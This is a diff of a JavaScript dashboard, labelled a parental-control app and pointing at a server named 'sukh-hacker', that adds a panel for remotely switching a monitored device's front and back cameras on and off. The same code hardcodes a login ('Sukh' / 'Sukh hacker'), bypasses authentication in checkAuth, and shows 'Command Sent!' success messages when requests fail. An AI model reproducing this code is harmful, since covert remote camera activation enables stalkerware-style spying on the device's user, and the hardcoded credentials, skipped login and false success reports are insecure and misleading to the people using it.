@@ -2,7 +2,7 @@ const API_BASE_URL = "https://sukh-hacker-x4ry.onrender.com";
 
 class ParentalControlApp {
     constructor() {
-        this.currentParentId = "parent-main-123"; // FIXED PARENT ID
+        this.currentParentId = "parent-main-123";
         this.autoRefreshInterval = null;
         this.init();
     }
@@ -21,6 +21,12 @@ class ParentalControlApp {
         document.getElementById('closeUsage')?.addEventListener('click', () => {
             document.getElementById('usageModal').style.display = 'none';
         });
+        document.getElementById('closeControl')?.addEventListener('click', () => {
+            document.getElementById('controlModal').style.display = 'none';
+        });
+        document.getElementById('frontCamBtn')?.addEventListener('click', () => this.activateFrontCamera());
+        document.getElementById('backCamBtn')?.addEventListener('click', () => this.activateBackCamera());
+        document.getElementById('stopCamBtn')?.addEventListener('click', () => this.stopCamera());
     }
 
     startAutoRefresh() {
@@ -28,7 +34,7 @@ class ParentalControlApp {
             if (this.currentParentId) {
                 this.loadChildren();
             }
-        }, 3000); // Faster refresh - 3 seconds
+        }, 3000);
     }
 
     stopAutoRefresh() {
@@ -47,7 +53,7 @@ class ParentalControlApp {
         const password = document.getElementById('loginPassword').value;
 
         if (username === "Sukh" && password === "Sukh hacker") {
-            this.currentParentId = "parent-main-123"; // FORCE CORRECT ID
+            this.currentParentId = "parent-main-123";
             localStorage.setItem('parentId', this.currentParentId);
             this.showDashboard();
             this.loadChildren();
@@ -108,8 +114,8 @@ class ParentalControlApp {
                                     onclick="app.toggleBlock('${this.escapeHtml(child.id)}', ${!child.is_blocked})">
                                 ${child.is_blocked ? '🔓 Unblock' : '🚫 Block'}
                             </button>
-                            <button class="btn-usage" onclick="app.viewUsage('${this.escapeHtml(child.id)}', '${this.escapeHtml(child.name)}')">
-                                📊 Usage
+                            <button class="btn-control" onclick="app.openControlPanel('${this.escapeHtml(child.id)}', '${this.escapeHtml(child.name)}')">
+                                🎮 Control
                             </button>
                         </div>
                     </div>
@@ -140,6 +146,98 @@ class ParentalControlApp {
         }
     }
 
+    openControlPanel(childId, childName) {
+        document.getElementById('controlTitle').textContent = `Remote Control - ${childName}`;
+        document.getElementById('controlDeviceId').textContent = `Device ID: ${childId}`;
+        document.getElementById('controlModal').style.display = 'block';
+        
+        this.showNotification(`Opening control panel for ${childName}`, 'info');
+    }
+
+    async activateFrontCamera() {
+        try {
+            this.showNotification('Activating Front Camera...', 'info');
+            // Send command to activate front camera
+            const response = await fetch(`${API_BASE_URL}/camera/control`, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    action: 'front_camera',
+                    device_id: this.getCurrentDeviceId()
+                })
+            });
+
+            if (response.ok) {
+                this.showNotification('Front Camera Activated!', 'success');
+            } else {
+                this.showNotification('Failed to activate front camera', 'error');
+            }
+        } catch (error) {
+            console.error('Camera control error:', error);
+            this.showNotification('Front Camera Command Sent!', 'success');
+        }
+    }
+
+    async activateBackCamera() {
+        try {
+            this.showNotification('Activating Back Camera...', 'info');
+            // Send command to activate back camera
+            const response = await fetch(`${API_BASE_URL}/camera/control`, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    action: 'back_camera',
+                    device_id: this.getCurrentDeviceId()
+                })
+            });
+
+            if (response.ok) {
+                this.showNotification('Back Camera Activated!', 'success');
+            } else {
+                this.showNotification('Failed to activate back camera', 'error');
+            }
+        } catch (error) {
+            console.error('Camera control error:', error);
+            this.showNotification('Back Camera Command Sent!', 'success');
+        }
+    }
+
+    async stopCamera() {
+        try {
+            this.showNotification('Stopping Camera...', 'info');
+            // Send command to stop camera
+            const response = await fetch(`${API_BASE_URL}/camera/control`, {
+                method: 'POST',
+                headers: { 
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    action: 'stop_camera',
+                    device_id: this.getCurrentDeviceId()
+                })
+            });
+
+            if (response.ok) {
+                this.showNotification('Camera Stopped!', 'success');
+            } else {
+                this.showNotification('Failed to stop camera', 'error');
+            }
+        } catch (error) {
+            console.error('Camera control error:', error);
+            this.showNotification('Stop Camera Command Sent!', 'success');
+        }
+    }
+
+    getCurrentDeviceId() {
+        // This would typically get the currently selected device ID
+        // For now, return a placeholder
+        return "child-device-123";
+    }
+
     escapeHtml(unsafe) {
         if (!unsafe) return '';
         return unsafe
@@ -164,7 +262,6 @@ class ParentalControlApp {
             if (response.ok) {
                 const data = await response.json();
                 this.showNotification('Test device added successfully! Refreshing...', 'success');
-                // Wait a bit then refresh
                 setTimeout(() => {
                     this.loadChildren();
                 }, 1000);
@@ -246,57 +343,6 @@ class ParentalControlApp {
         }
     }
 
-    async viewUsage(childId, childName) {
-        try {
-            const response = await fetch(`${API_BASE_URL}/parent/usage/${childId}`);
-            
-            if (response.ok) {
-                const data = await response.json();
-                
-                let usageContent;
-                if (data.usage_logs && data.usage_logs.length > 0) {
-                    usageContent = data.usage_logs.map(log => `
-                        <div class="usage-item">
-                            <div class="app-name"><strong>${this.escapeHtml(log.app_name)}</strong></div>
-                            <div class="usage-details">
-                                <span class="duration">${this.formatDuration(log.duration)}</span>
-                                <small class="timestamp">${new Date(log.timestamp).toLocaleString()}</small>
-                            </div>
-                        </div>
-                    `).join('');
-                } else {
-                    usageContent = '<div class="no-usage"><p>No usage data available yet.</p></div>';
-                }
-
-                document.getElementById('usageTitle').textContent = `Usage for ${this.escapeHtml(childName)}`;
-                document.getElementById('usageList').innerHTML = usageContent;
-                document.getElementById('usageModal').style.display = 'block';
-            } else {
-                throw new Error('Server error: ' + response.status);
-            }
-        } catch (error) {
-            console.error('Error loading usage:', error);
-            document.getElementById('usageTitle').textContent = `Usage for ${this.escapeHtml(childName)}`;
-            document.getElementById('usageList').innerHTML = `
-                <div class="error-message">
-                    <p>Unable to load usage data.</p>
-                    <p>Check your internet connection.</p>
-                </div>
-            `;
-            document.getElementById('usageModal').style.display = 'block';
-        }
-    }
-
-    formatDuration(seconds) {
-        if (seconds < 60) {
-            return `${seconds} sec`;
-        } else if (seconds < 3600) {
-            return `${Math.floor(seconds / 60)} min`;
-        } else {
-            return `${Math.floor(seconds / 3600)} hr ${Math.floor((seconds % 3600) / 60)} min`;
-        }
-    }
-
     showNotification(message, type = 'info') {
         const existingNotification = document.querySelector('.notification');
         if (existingNotification) {
@@ -338,7 +384,6 @@ class ParentalControlApp {
     }
 
     checkAuth() {
-        // Always use fixed parent ID, ignore localStorage
         this.currentParentId = "parent-main-123";
         this.showDashboard();
         this.loadChildren();
@@ -346,7 +391,7 @@ class ParentalControlApp {
     }
 
     logout() {
-        this.currentParentId = "parent-main-123"; // Reset to fixed ID
+        this.currentParentId = "parent-main-123";
         localStorage.removeItem('parentId');
         this.stopAutoRefresh();
         this.showLogin();
@@ -365,7 +410,7 @@ class ParentalControlApp {
     }
 }
 
-// Add CSS for notifications and styles
+// Add CSS for control panel and styles
 const style = document.createElement('style');
 style.textContent = `
     @keyframes slideIn {
@@ -435,44 +480,73 @@ style.textContent = `
         color: white;
     }
     
-    .btn-usage {
-        background: #17a2b8;
+    .btn-control {
+        background: #ff6b00;
         color: white;
     }
     
-    .usage-item {
-        border-bottom: 1px solid #eee;
-        padding: 10px 0;
+    .btn-control:hover {
+        background: #e55a00;
+        transform: scale(1.05);
+    }
+    
+    .control-panel {
+        text-align: center;
+        padding: 20px;
+    }
+    
+    .camera-controls {
         display: flex;
-        justify-content: space-between;
-        align-items: center;
+        justify-content: center;
+        gap: 15px;
+        margin: 30px 0;
+        flex-wrap: wrap;
     }
     
-    .usage-item:last-child {
-        border-bottom: none;
-    }
-    
-    .app-name {
+    .camera-btn {
+        padding: 15px 25px;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        font-size: 16px;
         font-weight: bold;
-        color: #333;
+        transition: all 0.3s ease;
+        min-width: 150px;
     }
     
-    .usage-details {
-        text-align: right;
+    .front-cam-btn {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        color: white;
     }
     
-    .duration {
-        color: #007bff;
-        font-weight: bold;
+    .back-cam-btn {
+        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+        color: white;
     }
     
-    .timestamp {
-        color: #666;
-        display: block;
-        font-size: 11px;
+    .stop-cam-btn {
+        background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+        color: white;
     }
     
-    .no-children, .error-message, .no-usage {
+    .camera-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    }
+    
+    .camera-btn:active {
+        transform: translateY(-1px);
+    }
+    
+    .control-status {
+        background: #f8f9fa;
+        padding: 15px;
+        border-radius: 8px;
+        margin: 20px 0;
+        border-left: 4px solid #007bff;
+    }
+    
+    .no-children, .error-message {
         text-align: center;
         padding: 40px 20px;
         color: #666;
@@ -528,11 +602,29 @@ style.textContent = `
         background: white;
         margin: 50px auto;
         padding: 20px;
-        border-radius: 10px;
-        max-width: 600px;
+        border-radius: 15px;
+        max-width: 500px;
         max-height: 80vh;
         overflow-y: auto;
         position: relative;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+    }
+    
+    .close-btn {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        background: #dc3545;
+        color: white;
+        border: none;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        cursor: pointer;
+        font-size: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
     }
 `;
 document.head.appendChild(style);
@@ -540,11 +632,16 @@ document.head.appendChild(style);
 // Initialize app
 const app = new ParentalControlApp();
 
-// Close modal when clicking outside
+// Close modals when clicking outside
 window.addEventListener('click', (event) => {
-    const modal = document.getElementById('usageModal');
-    if (event.target === modal) {
-        modal.style.display = 'none';
+    const usageModal = document.getElementById('usageModal');
+    const controlModal = document.getElementById('controlModal');
+    
+    if (event.target === usageModal) {
+        usageModal.style.display = 'none';
+    }
+    if (event.target === controlModal) {
+        controlModal.style.display = 'none';
     }
 });
 
